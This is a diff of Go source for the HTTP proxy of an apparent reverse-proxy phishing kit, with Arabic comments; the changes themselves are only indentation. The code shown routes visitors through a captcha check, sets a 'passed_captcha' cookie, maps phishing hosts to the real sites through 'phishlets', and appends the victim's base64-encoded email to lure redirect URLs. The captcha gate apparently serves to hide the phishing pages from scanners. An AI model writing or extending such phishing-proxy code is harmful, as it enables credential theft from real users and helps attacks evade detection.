@@ -170,7 +170,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
-
+			
 			// معالجة مباشرة لمسار verify_captcha
 			if req.URL.Path == "/verify_captcha" {
 				// السماح بالطلبات POST
@@ -1602,7 +1602,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 	captcha_cookie, err := req.Cookie("passed_captcha")
 	if err == nil && captcha_cookie.Value == "1" {
 		// المستخدم اجتاز الكابتشا، نتابع إلى رابط lure
-	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+		if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
 			phish_host := req.Host
 			_, ok := p.replaceHostWithOriginal(req.Host)
 			if ok {
@@ -1631,7 +1631,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 							}
 						}
 						
-		return p.javascriptRedirect(req, redirect_url)
+						return p.javascriptRedirect(req, redirect_url)
 					}
 				}
 			}
@@ -1644,7 +1644,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 					encodedEmail := base64.StdEncoding.EncodeToString([]byte(email))
 					if strings.Contains(redirect_url, "?") {
 						redirect_url += "&e=" + encodedEmail
-	} else {
+					} else {
 						redirect_url += "?e=" + encodedEmail
 					}
 				}
@@ -1676,7 +1676,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 						if success, ok := result["success"].(bool); ok && success {
 							// نجح التحقق، وضع الكوكي وإعادة التوجيه
 							resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-		if resp != nil {
+							if resp != nil {
 								expiration := time.Now().Add(24 * time.Hour)
 								cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
 								resp.Header.Set("Set-Cookie", cookie.String())
@@ -1718,9 +1718,9 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 								}
 								
 								resp.Header.Set("Location", redirectPath)
-			return req, resp
-		}
-	}
+								return req, resp
+							}
+						}
 					}
 				}
 			}
